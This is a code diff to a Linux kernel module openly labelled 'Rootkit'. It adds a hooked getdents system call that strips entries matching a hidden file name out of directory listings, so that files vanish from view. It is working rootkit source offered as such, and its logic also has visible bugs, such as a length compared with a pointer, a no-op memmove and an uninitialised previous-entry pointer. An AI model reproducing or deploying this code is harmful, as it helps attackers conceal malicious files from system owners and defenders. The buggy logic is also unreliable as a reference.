@@ -7,6 +7,8 @@
 #include <asm/pgtable_types.h>
 #include <linux/kallsyms.h>
 #include <linux/syscalls.h>
+#include <linux/fs.h>
+#include <linux/file.h>
 
 MODULE_AUTHOR("Parth Thakkar");
 MODULE_DESCRIPTION("Rootkit");
@@ -175,12 +177,61 @@ asmlinkage long fake_getdents64(int fd, struct linux_dirent64 * dirp, unsigned i
     return original_getdents64(fd, dirp, count);
 }
 
-asmlinkage long fake_getdents(int fd, struct linux_dirent * dirp, unsigned int count) {
+asmlinkage long fake_getdents(int fd, struct linux_dirent * original_dir_entry, unsigned int count) {
     printk("Fake getdents called \n");
+    struct linux_dirent *rootkit_dir_entry_structure;
+    // the output of getdents is the number of bytes read
+    long nbytes = (typeof(sys_getdents)*)(original_getdents)(fd, original_dir_entry, count);
     
 
-    long nbytes = (typeof(sys_getdents)*)(original_getdents)(fd, dirp, count);
-    return original_getdents(fd, dirp, count);
+//     kmalloc can be used in interrupt context with appropriate flags.
+// vmalloc cannot be used in interrupt context as it may sleep.
+// kvmalloc behavior depends on the flags and the actual allocation method used
+
+// Memory allocated by vmalloc and sometimes kvmalloc is visible in /proc/vmallocinfo, which can be useful for debugging.
+// kmalloc allocations are typically not directly visible in proc files but can be tracked using kernel memory debugging tools.
+
+// Provides a flexible allocation strategy combining kmalloc and vmalloc.
+    rootkit_dir_entry_structure = kvmalloc(nbytes, GFP_KERNEL);
+	if (rootkit_dir_entry_structure == NULL) {
+		pr_info("fake dents allocation error");
+        // used when memory is allocated with kvmalloc;
+		kvfree( rootkit_dir_entry_structure );
+		return -1;
+	}
+    copy_from_user(rootkit_dir_entry_structure, original_dir_entry, nbytes);
+
+
+    long offset = 0;
+    struct linux_dirent *current_rootkit_dir_entry, *prev_dir_entry;
+    unsigned short current_dir_record_lenth;
+    while(offset < nbytes){
+        // converting to void * is important as we need just byte addressable array
+        current_rootkit_dir_entry = (void *)rootkit_dir_entry_structure + offset;
+        current_dir_record_lenth = current_rootkit_dir_entry->d_reclen;
+
+        // check if name is matching
+        if(strstr(current_rootkit_dir_entry->d_name, HIDE_FILE) != NULL){
+            if(current_dir_record_lenth == rootkit_dir_entry_structure){
+                // match at first entry; then there is not previous entry to "absrob" it.
+                nbytes -= current_dir_record_lenth;
+                // so we move the memory by the lenght of current entry.
+                memmove(rootkit_dir_entry_structure, (void *)rootkit_dir_entry_structure, nbytes);
+            }
+            printk(KERN_INFO "hiding %s", current_rootkit_dir_entry->d_name);
+            // basically we are moving two times when reading previous entry
+            // , one own record lenght and other current record length
+            prev_dir_entry->d_reclen += current_dir_record_lenth;
+        }
+        else{
+            // if no match then  previous would be current
+            prev_dir_entry = current_rootkit_dir_entry;
+        }
+        offset += current_dir_record_lenth;
+    }
+    copy_to_user(original_dir_entry, rootkit_dir_entry_structure, nbytes);
+    kvfree(rootkit_dir_entry_structure);
+    return nbytes;
 }
 
 
